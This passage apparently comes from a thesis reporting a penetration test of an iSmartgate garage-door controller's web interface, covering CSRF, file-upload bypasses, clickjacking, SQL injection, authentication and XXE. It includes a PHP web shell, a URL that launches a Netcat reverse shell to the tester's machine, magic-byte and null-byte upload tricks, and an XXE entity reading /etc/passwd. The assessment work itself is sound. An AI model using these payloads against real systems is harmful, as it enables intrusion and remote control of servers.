It was possible to upload a sound ﬁle (WAV) by exploiting the CSRF vulnera-
bility, via /index.php. The attacker could specify the sound ﬁle to be uploaded.
The PoC was created by using Burp Suite Professional’s automation tool, and
can be found in appendix C in listing C.2.

5.3.4 Discussion

For ﬁnding 1 the attack only works if the targeted user is logged in as admin.
If the user doesn’t have admin privileges, the request will be denied.

For ﬁnding 2 the attack will work independent of which type of privileges the

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

48
RESULT & DISCUSSION

targeted user has. All user accounts have the ability to open and close garage
doors/gates.

Finding 3 and 4 are not by themselves posing any severe impact. They could
be used to upload unwanted images or sounds. What is more important here
is that ﬁle uploading functionalities could be vulnerable to unrestricted ﬁle
uploading, thus allowing an attacker to upload malicious ﬁles outside of the
deﬁned scope of allowed ﬁle types. This was tested in section 5.4.

All GET requests had this vulnerability, but because of the intended usage
of GET (instead of POST) is to not change any state on the server, it should
not be considered a risk. If it is a state changing request, like in ﬁnding 2, it is
more secure to implement the request as a POST request.

All POST requests were vulnerable to CSRF, except for the requests requir-
ing Admin’s password. It is not possible to auto-submit a POST form without
knowing the password. It could be combined with a data leakage, either from
the iSmartgate product or from another platform which can be linked to the
same user. To prompt for the user’s password in all POST requests is not a
recommended security control to prevent CSRF, there are more eﬃcient ways
to not cause a trade-oﬀ between the usability and the security of the applica-
tion.

The CSRF vulnerability could be used in combination with other vulnera-
bilities to make it possible for an unauthenticated remote attacker to access
vulnerabilities that require authentication to be exploited. To deliver an attack
including a CSRF vulnerability, the attacker could use phishing. By sending
an email containing a link to the targeted request, the attack would reach its
victim.

5.4 Exploitation Task 3: Unrestricted File Up-

load

Attempt to exploit the functionality of uploading ﬁles to the web server through
the web application.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
49

RESULT & DISCUSSION

5.4.1 Background

When uploading a ﬁle, the server receives user input that will be stored on
the server. Without restrictions to what is allowed to be uploaded, this feature
could be used by an attacker to write malicious code to the application. Then
the attacker only needs to ﬁnd a way to execute the uploaded code for the at-
tack to be complete.

The consequences can vary from denial of service goals, such as defacement
of a website or blocking others from storing data by running the server out of
storage, to gain full control over the application.

There are ﬁve parameters that can be used to validate the input ﬁle.

1. File extension

2. Content-type

3. Magic bytes/File signature/Magic numbers

4. Content

5. File size

Parameters 1-4 are shown in ﬁgure 5.4. The ﬁle extension should match the
allowed ﬁle formats. For example it should not be possible for a user to upload
image.php, when only PNG ﬁles are allowed.

The content-type ﬁeld is used by the client to tell the server the media type
of the input resource 7. When a ﬁle is being sent, the content-type for the whole
HTTP POST request is set to multipart/form-data; boundary=something. This
means that the message body of the POST request will be divided into multi-
ple parts, divided by the determined boundary. In ﬁgure 5.4 the boundary is
clearly displayed at the top and at the bottom of the part containing the data
for uploading the ﬁle:

------WebKitFormBoundaryTB4eQ8UVUxgcg3KX

Besides this global entity header, the part of the message body that contains
the input ﬁle has its own content-type entity header. Example of values are im-
age/png, application/x-php, audio/wav and text/plain. The value should match

7https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type

|

Pub-

lished 2020-04-24, visited 2020-05-26

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

50
RESULT & DISCUSSION

Figure 5.4: 1: ﬁle extension, 2: content-type, 3: magic bytes and 4: content

the allowed content types.

The magic bytes are placed at the start of a ﬁle, which are unique to a par-
ticular ﬁle type. They aren’t visible to the user, but can be displayed by using
tools such as a hex editor. For a PNG ﬁle the magic bytes are:

8950 4E47 0D0A 1A0A

In ﬁgure 5.4 the magic bytes are displayed in ASCII. They are supposed to
match the allowed set of magic bytes.

The actual content of the ﬁle can also be used for validation of the input. It
is possible to place malicious code inside the content, while having the above
three parameters correct.

The ﬁfth parameter is the ﬁle size. If there is no maximum ﬁle size set, a
user could cause a denial of service by uploading a huge ﬁle. The process for
uploading the ﬁle to the server could hold up resources, or the size of the ﬁle
will ﬁll up the space on the server and leaving no space left for others to upload
ﬁles.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
51

RESULT & DISCUSSION

5.4.2 Method

The goal of the test was to bypass potential security measures in order to up-
load a malicious ﬁle. In this case, the malicious ﬁle was chosen to be a PHP
script executing the function phpinfo().

Three things were needed to be known:

1. Which are the requests used for ﬁle uploading,

2. Where will the uploaded ﬁles be stored,

3. Which parameters are used for input validation.

First, requests used for uploading ﬁles were enumerated. Then an attempt was
made to upload a legitimate ﬁle and check the HTML document to see if it
said the location of the uploaded ﬁle. If the location was displayed, an attempt
was made to access it through the browser (e.g. www.website.com/location/of/
uploaded/ﬁle).

To gather information about which parameters are used for validation, two
steps were done. The ﬁrst step was to inspect the HTML documents to see
if there were any information about allowed ﬁle extensions or ﬁle sizes. The
second step included multiple tests of uploading ﬁles and manipulate param-
eters 1-4. Burp Suite Professional was used to manipulate the parameters in
the proxy set up between the client and server. The made manipulations of the
parameters were:

Testing of unrestricted ﬁle uploads

01. Directly upload info.php without making any manipulations.
FE: info.php
Content: <?php phpinfo() ?>

CT: application/x-php

MB: –

02. Upload info.php.jpg without making any manipulations.
FE: info.php.jpg
Content: <?php phpinfo() ?>

CT: image/jpeg

MB: –

03. Upload info.php.jpg and remove the JPG extension in the proxy.
CT: image/png
FE: info.php
Content: <?php phpinfo() ?>

MB: –

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

52
RESULT & DISCUSSION

Continuation of Table 4.7

04. Upload info.php and change content-type to image/png in the proxy.
FE: info.php
Content: <?php phpinfo() ?>

CT: image/php

MB: –

05. Upload info.php3 without manipulations.
FE: info.php3
Content: <?php phpinfo() ?>

CT: application/x-php

MB: –

06. Upload info.php3 with extensions JPG/JPEG/PNG and without manipula-
tion.
CT:
FE:
info.php.JPG/JPEG/PNG
age/png
Content: <?php phpinfo() ?>

image/jpeg or im-

MB: –

07. Upload image.png with the PHP payload in the metadata.
FE: image.png

CT: image/png

MB:
8950 4E47 0D0A 1A0A

Content: A normal PNG image with metadata containing <?php phpinfo() ?>

08. Upload image.jpg and image.jpeg with the PHP payload as a comment.
FE:
age.jpeg

image.jpg and im-

CT: image/jpeg

MB:
FFD8 FFE0 0010 4A46
4946 0001

Content: A normal JPG image with a comment containing <?php phpinfo() ?>

info.php%001.jpg

09. Upload info.php.jpg and include null bytes as terminator.
FE:
and info.php\x00.jpg
Content: <?php phpinfo() ?>

CT: image/jpeg

MB: –

10. Upload info.phpD.jpg and replace D with 00 (null bytes) as terminator in
the proxy.
FE: info.php\x00.jpg
Content: <?php phpinfo() ?>

CT: image/jpeg

MB: –

11. Upload a large ﬁle.
FE: largeﬁle.txt

CT: text/plain

MB: –

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
53

RESULT & DISCUSSION

Figure 5.5: Magic bytes of JPG are marked with orange background

Content: the password list rockyou (133.4 MiB)

Continuation of Table 4.7

12. Upload info.php and add PNG magic bytes in the proxy.
FE: info.php

CT: application/x-php

MB:
8950 4E47 0D0A 1A0A

Content: <?php phpinfo() ?>

12. Upload info.php and add JPG magic bytes in the proxy.
FE: info.php
Content: <?php phpinfo() ?>

CT: application/x-php

MB: See ﬁgure 5.5

End of Table

Table 5.1: Manipulations made to the ﬁle parameters. | FE =
ﬁle extension, CT = content-type and MB = magic bytes.

5.4.3 Result

Four POST requests were used for uploading ﬁles:

1. Upload images (PNG, JPG, JPEG) for demonstrating the doors being

open and closed

2. Upload sounds (WAV) to be played when opening and closing the doors

3. Upload a user database (BK) to replace the current user database

4. Upload new ﬁrmware

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

54
RESULT & DISCUSSION

Only number 1 and 2 indicated where the destination was on the server for the
uploaded ﬁle. Those two are described in the ﬁndings below.

Finding 1

The request to upload images was investigated ﬁrst. Six images could be
uploaded, and they would be stored as imgopen1.png, imgclose1.png, im-
gopen2.png, imgclose2.png, imgopoen3.png and imgclose3.png with one of
the allowed extensions PNG/JPG/JPEG. Figure 5.6 presents the view of the
POST form used to upload images to door 3.

Figure 5.6: The form used to upload images to door number 3

All tests from table 5.1 were made:

• Tests 1-6 and 9-10 didn’t get uploaded

• Test 7 and 8 both had their images uploaded, but when downloading the
uploaded ﬁles the comments didn’t contain the PHP payload anymore

• Test 11 returned the error message 413 Request Entity Too Large from

the Nginx server

• Test 12 and 13 had their ﬁles uploaded as imgopen1.php and the function

phpinfo() executed

The application only validated the magic bytes to be one of the allowed ﬁle
formats. It was possible to upload a PHP ﬁle with two conditions:

1. Inclusion of allowed magic bytes of PNG/JPG/JPEG

2. The ﬁle extension set to PHP

A full PoC can be found in appendix C in listing C.1.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
55

RESULT & DISCUSSION

Finding 2

Six sounds could be uploaded, and they were stored as soundopen1.wav, sound-
close1.wav, soundopen2.wav, soundclose1.wav, soundopen3.wav and sound-
close1.wav. The request to upload sound ﬁles was also vulnerable to unre-
stricted ﬁle upload. It was possible to upload a PHP ﬁle with two conditions:

1. Inclusion of allowed magic bytes of WAV

2. The ﬁle extension set to PHP

The output from accessing the uploaded PHP ﬁle can be found in ﬁgure 5.7.
A full PoC can be found in appendix C in listing C.2.

Figure 5.7: Output from uploading a PHP ﬁle instead of a sound ﬁle, including
the phpinfo() function

5.4.4 Discussion

Unrestricted ﬁle upload can be said to be a critical vulnerability, since an ad-
versary could exploit it. For example an adversary could upload a backdoor,
which in turn could be used for installing malware.

Further testing was made, and it was possible to upload a PHP script contain-
ing a more dangerous payload. The mentioned script opens up a PHP shell
on the web server, that can be accessed through a GET request. The attacker
could send shell commands to the web server through the PHP shell. Here is
how the payload looked liked:

1 <? php
2

3
4 ? >

$cmd = $_GET [‘cmd’];
s y s t e m ( $cmd ) ;

For example, to list the current working directory, the command could easily
be sent to the server by typing:

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

56
RESULT & DISCUSSION

1 http : / / 1 9 2 . 1 6 8 . 1 . 1 0 0 / isg / i m g _ d o o r s / i m g c l o s e 2 . php ? cmd = ls

Or to open a Netcat reverse shell, which is more stable than the PHP shell, the
following command is used:

1 http : / / 1 9 2 . 1 6 8 . 1 . 1 0 0 / isg / i m g _ d o o r s / i m g c l o s e 2 . php ? cmd = nc

% 2 0 1 9 2 . 1 6 8 . 1 . 1 0 4 % 2 0 4 4 4 4 % 2 0 - e %20/ bin / bash

The server will then try to connect to the attacker’s machine, in this case
192.168.1.104 on port 4444. When the connection is being made, the program
/bin/bash will be executed. Important here is to make sure that the attacker’s
port 4444 is listening to incoming connections, before the command is being
sent to the server.

An interesting build-on to the unrestricted ﬁle upload vulnerability, is to com-
bine it with the CSRF vulnerability. It was shown that it was possible to exploit
CSRF to upload ﬁles remotely as an unauthenticated user.

5.5 Exploitation Task 4: Clickjacking

Attempt to exploit clickjacking vulnerability.

5.5.1 Background

Clickjacking reminds a lot of CSRF, with the delivery of the attack needing
user interaction. The main diﬀerence between the two vulnerabilities is that
clickjacking requires more interaction from the user. Clicking a link in an
email is not enough. The user has to click on a button placed on a decoy web-
site, controlled by the adversary 8.

The goal of clickjacking is to get the user to perform an action without being
aware. The adversary has to lure the user to a malicious website, controlled
by the adversary. The malicious website contains two layers:

1. Bottom layer has a decoy website, with a button aligned with the top

layer button. The user can clearly see this layer.

2. Top layer has the legitimate website, with a button that needs to be
pressed for the attack to succeed. The transparency is set to high, and
the user can not see this layer.

8https://portswigger.net/web-security/clickjacking | Published unknown, visited 2020-05-

30

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
57

RESULT & DISCUSSION

Figure 5.8: Top and bottom layer of the malicious website

When the user is "clicking" on the bottom layer button, the click is actually
being registered on the top layer button. Since the user can not see the top
layer button, the user will think that they have clicked the visible bottom layer
button. The two layers are described in ﬁgure 5.8.

Protection against CSRF does not help preventing clickjacking attacks.

5.5.2 Method

The testing was done by set up a website with two layers. The top layer was
embedded with an iframe, and had the opacity set to 0.0. It pointed to the
page managing the user accounts of the controller. The goal was to perform a
denial of service attack, by deleting a user account. The decoy website had a
descriptive text and a button that was aligned with the delete button from the
web application’s interface.

After the creating of the malicious website, it was tested by having an au-
thenticated user accessing the website and clicking the decoy button.

5.5.3 Result

Finding 1

The web application was vulnerable to clickjacking. The malicious website
used for the attack can be seen in ﬁgure 5.9, where the view is as the victim
would see the website. In ﬁgure 5.10 the opacity has been changed to 0.5 for
the top layer, displaying how the delete button is aligned with the decoy button
captioned with Click. The full PoC can be found in the appendix D in listing
D.1.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

58
RESULT & DISCUSSION

Figure 5.9: How the malicious website looks like for the victim

Figure 5.10: How the website looks like with the top layer’s opacity set to 0.5

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
59

RESULT & DISCUSSION

5.5.4 Discussion

Clickjacking can be used to make the user perform unwanted actions. In this
test, the removal of a user account was made, but it is possible to embed any
page from the web application of the controller and exploit it.

Like with CSRF, the victim has to be logged in for the attack to succeed. De-
pending on which request is being targeted, in this case it was the deletion of
a user account, the admin user has to be the victim and not a normal user.

Another similarity with CSRF is that clickjacking can be combined with other
vulnerabilities in attacks, to allow an unauthenticated remote attacker to ex-
ploit vulnerabilities requiring authentication.

5.6 Exploitation Task 5: Remote Code Exe-

cution

The initial vulnerability scan from Nessus ﬂagged for a potential remote code
execution vulnerability in the web application of the controller.

5.6.1 Background

Remote code execution is also known as RCE. It is a broad category of vul-
nerabilities, but with the common goal of being able to remotely execute code
on the targeted system [18].

5.6.2 Method

Nessus had pointed out a Metasploit module to both check for the vulnerability
and to perform the attack. The module was used for testing the attack. It was
called:

PHP-FPM Underflow RCE
exploit/multi/http/php_fpm_rce

The module uses an underﬂow vulnerability found in PHP-FPM on Nginx. It
only works for certain conﬁgurations of Nginx and PHP-FPM 9.

9https://www.rapid7.com/db/modules/exploit/multi/http/php_fpm_rce | Published 2020-

03-05, visited 2020-06-02

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

60
RESULT & DISCUSSION

5.6.3 Result

The attack was not successful. It did not pass the check method implemented
in the Metasploit module.

5.6.4 Discussion

Assuming that the Metasploit module was implemented correctly, the web ap-
plication did not fulﬁll the requirements for a successful exploit.

5.7 Exploitation Task 6: Command Injection

The initial vulnerability scan from Nessus ﬂagged for a potential command
injection vulnerability in the web application of the controller.

5.7.1 Background

Command injection also goes under the names OS command injection and
shell injection. The goal of the attack is to execute OS commands on the tar-
geted server 10,11.

Web application servers may need to communicate with the underlying OS,
and it is done by sending commands that the OS can understand. The OS has
a lot of abilities to reveal, modify and create data. If an adversary gets hold
of a command injection vulnerability, they could for example get access to
databases or pivot to other systems within the organization.

5.7.2 Method

Nessus had pointed out a Metasploit module to perform the attack. The module
was used for testing the attack. It was called 12:

php imap_open Remote Code Execution
exploit/linux/http/php_imap_open_rce

10https://portswigger.net/web-security/os-command-injection | Published unknown, vis-

ited 2020-06-02

11https://www.netsparker.com/blog/web-security/command-injection-vulnerability/

|

Published 2019-07-04, visited 2020-06-02

12https://www.rapid7.com/db/modules/exploit/linux/http/php_imap_open_rce | Published

2020-03-19, visited 2020-06-02

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
61

RESULT & DISCUSSION

The module exploits the function imap_open in PHP to execute OS commands
13. This can be done both remotely and locally. The problem is that the libc-
client uses /usr/bin/rsh for connections to a given hostname, if a space char is
given all arguments go to a execve call. In Debian based OS, rsh is a link to
ssh. By using the ﬂag -oProxyCommand in the call, it is possible to insert OS
commands.

5.7.3 Result

The web application was not vulnerable to this attack.

5.7.4 Discussion

Assuming that the Metasploit module was implemented correctly, the web ap-
plication did not fulﬁll the requirements for a successful exploit.

5.8 Exploitation Task 7: SQL Injection

The attack vector to be explored is SQL injections.

5.8.1 Background

Injections is one of OWASP Top Ten web vulnerabilities. They can be found
in many diﬀerent types of queries, commands, headers or parsers. In the pre-
vious section 5.7, command injections were brought up. Here the tests focus
on SQL injections.

The cause of the vulnerability is that user input is allowed to execute. This
leads to queries interacting with the database and retrieving/modifying/delet-
ing data 14. An example of an SQL query showing all public posts written by
a speciﬁed user:

SELECT * FROM posts WHERE author = 'User' AND
public = 1;

An attack on that query could be to try to retrieve all posts, even the ones that
are not public:

13https://bugs.php.net/bug.php?id=76428 | Published 2020-06-08, visited 2020-06-02
14https://portswigger.net/web-security/sql-injection | Published unknown, visited 2020-

06-02

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

62
RESULT & DISCUSSION

SELECT * FROM posts WHERE author = '--' AND
public = 1;

The -- double dash characters are used in some SQL languages to indicate
the beginning of a comment. Everything after will be treated as a comment
and not executed.

What to avoid is to concatenate the user input string with the SQL query. In-
stead, a good practise is to use prepared statements (also known as parameter-
ized queries).

Example of a concatenated query:

1 S t r i n g query = " S E L E C T * FROM p r o d u c t WHERE c a t e g o r y = '" +

input " '" ;

2 S t a t e m e n t s t a t e m e n t = c o n n e c t i o n . c r e a t e S t a t e m e n t () ;
3 R e s u l t r e s u l t = s t a t e m e n t . e x e c u t e Q u e r y ( query ) ;

Example of a prepared statement:

1 P r e p a r e d S t a t e m e n t s t a t e m e n t = c o n n e c t i o n . p r e p a r e S t a t e m e n t ( "

S E L E C T * FROM p r o d u c t WHERE c a t e g o r y = ? " ) ;

2 s t a t e m e n t . s e t S t r i n g (1 , input ) ;
3 R e s u l t r e s u l t = s t a t e m e n t . e x e c u t e Q u e r y () ;

5.8.2 Method

An automation tool was used to fuzz for SQL injection vulnerabilities. The
tool Intruder from Burp Suite Professional was set to use the predeﬁned pay-
load list of SQL injection queries. It was launched on all user input ﬁelds in
the web interface.

The responses of the fuzzing was analyzed by looking at the size of the re-
sponse. The most interesting responses were the outliers, which either had a
smaller or greater size. They were inspected for errors revealing information
about the database or a successful injection.

5.8.3 Result

No database error or successful SQL injection were made.

5.8.4 Discussion

When the SQL injection tests were made, information about which database
was used did not exist. Nor did the access to the web application server. With

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
63

RESULT & DISCUSSION

that information it would have been possible to audit the source code used for
the SQL queries, and look for protections. It would also have been possible to
create a speciﬁc payload list for the fuzzing, only consisting of SQLite known
injection payloads.

With access to the web server, each ﬁle making a query to the database could
be audited for concatenated input strings in queries. If prepared statements are
used it would prove the database queries to be secure.

5.9 Exploitation Task 8: Broken Authentica-

tion

Broken authentication comes from OWASP Top Ten.

5.9.1 Background

Attacks on session management are common, since the implementation and
design of access control can be diﬃcult. Adversaries could compromise cre-
dentials, such as passwords or keys, or assume another user’s identity.

Many types of vulnerabilities fall under this category. It could be anything
from allowing automated attacks or permitting weak passwords, to misconﬁg-
ured multifactor authentication or session IDs not being invalidated.

5.9.2 Method

Questions asked here were based on OWASP Top Ten information sheet about
broken authentication 15:

1. Does the application allow weak or well-known passwords?

2. Does the application allow brute force attacks?

3. Does the password recovery function use knowledge-based answers?

4. Does the application have multi-factor authentication?

5. Does the application rotate session IDs after successful login?

15https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-

Broken_Authentication | Published unknown, visited 2020-06-02

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

64
RESULT & DISCUSSION

6. Does the application properly invalidate session IDs?

5.9.3 Result

The web application had the following result.

Does the application allow weak or well-known passwords?

Yes, the ﬁrst time the owner logs in to the controller, the user name admin is
used with a blank password. During the ﬁrst log in, which is during the instal-
lation of the smart garage, the owner is forced to set a password for the admin
account. The minimum length for the password for logging into the controller
is one character for all users, and common passwords such as password are
allowed.

The minimum length for the password for connecting to the access point mode
of the controller is eight characters, and common passwords such as 12345678
are allowed.

Does the application allow brute force attacks?

No, after typing the wrong password six times, for logging into the controller,
the application requires the user to enter a CAPTCHA code. The CAPTCHA
code is 4 characters long, with lower case letters a-z and numbers 0-9.

Does the password recovery function use knowledge-based answers?

No, for logging into the controller there is no knowledge-based password re-
covery. After one failed attempt to login, the user can press the recovery but-
ton, and ﬁll out the username of the account to recover. The following infor-
mative message will be displayed:

An email has been sent to: te*****@*****k.com

The asterisks are ﬁxed, and do not represent the length of the hidden characters.

Does the application have multi-factor authentication?

No, the controller does not have the option to enable multi-factor authentica-
tion.

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
65

RESULT & DISCUSSION

Does the application rotate session IDs after successful login?

No, the controller does not rotate the session cookie after a successful login.
When an unauthenticated user accesses the login page of the controller, a ses-
sion cookie is presented to the browser. After the user logs in, the same session
cookie is used.

The session cookie does not get exchanged in-between sessions in the same
browser. If the user Alice logs in, she gets cookie A. When Alice logs out,
cookie A is invalid and it can not be used to act as Alice, but no rotation is
being made. The user Bob wants to log in from the same browser as Alice.
He will be assigned the same cookie A as Alice.

Does the application properly invalidate session IDs?

The session cookie gets invalid when pressing the button to logout. If the user
closes the session without clicking logout, the session cookie is still valid. The
session cookie is valid for 72-94 hours, if the user did not actively press the
logout button.

5.9.4 Discussion

These tests were done before having access to the source code of the controller.
The answer of how long a session cookie is valid could be tuned to a more pre-
cise value, by inspecting the program used for session management.

According to OWASP, the usage of CAPTCHA is eﬀective in stopping brute-
force attacks and other automated attacks 16. The important part is to make
sure that the presented CAPTCHA is diﬃcult to guess, not that it should be
diﬃcult to understand. By having the challenge set to 4 characters with lower
case letters a-z (26 letters) and numbers 0-9 (10 numbers), the number of pos-
sibilities are 36 to the power of 4 (1,679,616 possibilities).

There are security improvements that could be done to the web application
regarding the authentication. The improvements could be:

• Increase the minimum password length

• Restrict the use of well-known passwords

16https://owasp.org/www-community/controls/Blocking_Brute_Force_Attackssidebar-

using-captchas | Published unknown, visited 2020-06-04

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

66
RESULT & DISCUSSION

• Implement the option to enable multi-factor authentication

• Rotate the session cookie after logging in

5.10 Exploitation Task 9: Sensitive Data Ex-

posure

Sensitive data exposure comes from OWASP Top Ten.

5.10.1 Background

Data in a web application can either be seen in transit between the client and
the server, or stored on the server. Many protections could be in place to pre-
vent an attacker from getting to the server, but if that happens the data should
be easy to comprehend and use. By encrypting and/or hashing the stored data,
it will be unreadable to the attacker. This applies to data in transit as well.

For passwords it is recommended to use a hash function to store them 17. A
hash function is a one-way function, meaning that it is not possible to decrypt
it. It helps preserving the integrity of the data. To prevent password cracking
attacks, the passwords get salted before they pass through the hash function.
The salt is a randomly generated string that is added the password. An at-
tacker would have to try all combinations of salt together with the potential
passwords in order to crack the hash.

Encryption can be implemented on diﬀerent levels of an application 18. For
example application level, network level, database level, ﬁlesystem level or
hardware level. Encryption preserves the conﬁdentiality of the application.
Encrypted data can be made readable again by decrypting it. In order to en-
crypt/decrypt data, secret keys have to be used. There are two ways encryption
can be made, either symmetric or asymmetric. In symmetric encryption one
shared secret key is used for both encrypt/decrypt the message. In asymmetric
encryption, each participant in the communication has their own set of keys.
One key is considered to be public and used to encrypt messages. The other
key is a private key, used to decrypt messages.

17https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

|

Published unknown, visited 2020-06-03

18https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html

| Published unknown, visited 2020-06-03

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
67

RESULT & DISCUSSION

Cryptographic algorithms are diﬃcult to invent. That is why there are organi-
zations producing standards for the public to use, instead of forcing individuals
and companies to design their own 19,20.

For data in transit, the protocol Transport Layer Security (TLS) is used to
encrypt data. TLS utilizes both symmetric and asymmetric encryption. Data
sent using the protocol HTTPS is using TLS.

Eavesdropping is an attack against data in transit [19]. An attacker could tap in
to the communication and read the data being sent. Another attack is man-in-
the-middle (MITM) attack [20], where the attacker intercepts the communica-
tion between to parts and pretends to be the correct recipients in both ends. A
MITM attack can read the messages, but also control the communication ﬂow,
and for example redirect the victim to a malicious website instead of a trusted
website.

5.10.2 Method

Questions asked here were based on OWASP Top Ten information sheet about
sensitive data exposure:

1. Is any data transmitted in clear text?

2. Are any old or weak cryptographic algorithms used either by default or

in older code?

The tool Wireshark was used to identify protocols being used. Which does
hand in hand with performing an eavesdrop attack on the communication.

An ARP poisoning attack was made with the tool Ettercap, to place the attacker
between the client and the server. It was performed already in the information
gathering phase.

19https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html

| Published unknown, visited 2020-06-03

20https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html

| Published unknown, visited 2020-06-03

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

68
RESULT & DISCUSSION

5.10.3 Result

Is any data transmitted in clear text?

Yes, the controller can communicate over both HTTP and HTTPS. When us-
ing HTTP the data in the communication is sent in clear text. When the user
remotely communicates with the controller’s web application (through the re-
lay server), it is possible to choose from HTTP or HTTPS. When connecting
to the web application locally, by using the IP address, all communication is
over HTTP. There is no port open for encrypted communication, like standard
port 443.

Are any old or weak cryptographic algorithms used either by default or
in older code?

No, TLS v1.2 is being used for the HTTPS communication.

5.10.4 Discussion

Having the communication unencrypted leaves it vulnerable to MITM and
eavesdropping attacks. Both the eavesdropping attack and the MITM attack
were done in the information gathering phase described in section 2.3, while
capturing traﬃc. The same way the traﬃc capturing was used for this work, it
could be used by an attacker to gather information about communication.

Even though TLS v1.2 is not the most recent version of TLS, it is still con-
sidered by for example NIST to be secure 21. It is recommended to develop
migration plans to support the newer version TLS v1.3.

More detailed inspection of the cryptographic algorithms used in the web ap-
plication could be done after gaining access to the source code. It would be
interesting to see which cipher suites were allowed, the key lengths, where the
keys were stored and general key management. Due to the order these tests
were made in, there was no time left to go back and investigate the sensitive
data exposure once a shell was established on the server.

21https://csrc.nist.gov/News/2019/nist-publishes-sp-800-52-revision-2 | Published 2020-

06-22, visited 2020-06-24

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,
69

RESULT & DISCUSSION

5.11 Exploitation Task 10: XXE

XML external entities (XXE) comes from OWASP Top Ten.

5.11.1 Background

XML is a standard format used for storing and transmitting structured data in
text format 22. XML stands for eXtensible Markup Language, and is a markup
language just like HTML. It is often used as a compliment to HTML, where
XML stores and transports data and HTML displays data.

Here is an example of a movie rental service:

1 <? xml v e r s i o n = " 1.0 " e n c o d i n g " UTF -8 " ? >
2 < r e n t a l m o v i e s >
3

< movie c a t e g o r y = " t h r i l l e r " >

4

5

6

7

8

9

10

11

12

13

< title lang = " en " > T w i l i g h t </ title >
< d i r e c t o r > C a t h e r i n e H a r d w i c k e </ d i r e c t o r >
< r e l e a s e d a t e > N o v e m b e r 17 , 2008 </ r e l e a s e d a t e >
< price > 5.00 </ price >

</ movie >
< movie c a t e g o r y = " a c t i o n " >

< title lang = " en " > War Horse </ title >
< d i r e c t o r > S t e v e n S p i e l b e r g </ d i r e c t o r >
< r e l e a s e d a t e > D e c e m b e r 25 , 2011 </ r e l e a s e d a t e >
< price > 5.00 </ pr ice >

</ movie >

14
15 </ r e n t a l m o v i e s >

Processing XML is when a software program uses XML documents as input
and then executes some instructions accordingly 23. The programs process-
ing XML are called XML processors. One type of processor is a parser. The
parser reads an XML document and translates it into a more suitable represen-
tation that can be used by other programs or subroutines.

A Document Type Deﬁnition (DTD) 24 can be used to deﬁne the structure
and the legal attributes and elements of an XML document. The DTD infor-
mation can either be imported from a ﬁle (external DTD), imported from a
public ﬁle (public external DTD) or directly written into the XML document
(internal DTD). In this example the DTD is external (Rentalmovies.dtd) and
can be included in the XML document in the following way:

22https://www.w3schools.com/xml/xml_whatis.asp | Published unknown, visited 2020-

06-04

23https://www.tutorialspoint.com/xml/xml_processors.htm | Published unknown, visited

2020-06-04

24https://www.w3schools.com/xml/xml_dtd.asp | Published unknown, visited 2020-06-24

CHAPTER 5. EXPLOITATION & POST EXPLOITATION: METHOD,

70
RESULT & DISCUSSION

1 <? xml v e r s i o n = " 1.0 " e n c o d i n g " UTF -8 " ? >
2 <! D O C T Y P E r e n t a l m o v i e s S Y S T E M " R e n t a l m o v i e s . dtd " >
3 < r e n t a l m o v i e s >
4

< movie c a t e g o r y = " t h r i l l e r " >

5

6

7

8

< title lang = " en " > T w i l i g h t </ title >
< d i r e c t o r > C a t h e r i n e H a r d w i c k e </ d i r e c t o r >
< r e l e a s e d a t e > N o v e m b e r 17 , 2008 </ r e l e a s e d a t e >
< price > 5.00 </ price >

</ movie >

9
10 </ r e n t a l m o v i e s >

Example of a DTD ﬁle:

1 <! D O C T Y P E r e n t a l m o v i e s [
2

<! E L E M E N T r e n t a l m o v i e s ( movie +) >
<! E L E M E N T movie ( title , director , r e l e a s e d a t e , price ) >
<! E L E M E N T title (# P C D A T A ) >
<! E L E M E N T d i r e c t o r (# P C D A T A ) >
<! E L E M E N T r e l e a s e d a t e (# P C D A T A ) >
<! E L E M E N T price (# P C D A T A ) >

3

4

5

6

7
8 ] >

DTD can also be used to deﬁne strings or special characters used in an XML
document. This is where external entities are introduced, by specifying a uni-
form resource identiﬁer (URI) to evaluate data from. Here is an example of
including an external entity:

1 <! E N T I T Y price S Y S T E M " h t t p s : // www . e x a m p l e . com / p r i c e l i s t . dtd " >
2
3 < price >& price ; </ price >

Speciﬁcation of an external entity is allowed in older XML processors, and
an attacker could create a malicious XML request by altering the URI 25. The
URI could be set to a ﬁle on the targeted web server or to a ﬁle on a diﬀerent
machine within the private network of the web server.

Information disclosure or denial of service are at stake here. For example,
by attempting to include a potentially endless ﬁle as the external entity a DoS
attack could be created. Here follows an example of an external entity trying
to extract data from the /etc/passwd ﬁle:
1 <? xml v e r s i o n = " 1.0 " e n c o d i n g = " ISO -8859 -1 " ? >
2 <! D O C T Y P E foo [
3

<! E L E M E N T foo ANY >
<! E N T I T Y xxe S Y S T E M " file: /// etc / p a s s w d " >

4
5 ] >
6
